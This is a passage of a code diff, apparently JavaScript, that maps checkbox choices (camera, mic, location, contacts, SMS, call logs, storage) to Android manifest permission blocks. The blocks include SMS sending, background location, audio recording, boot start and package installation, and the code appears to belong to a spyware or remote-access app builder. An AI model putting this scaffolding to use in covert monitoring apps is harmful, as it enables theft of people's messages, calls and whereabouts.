+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+        // if 5 checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
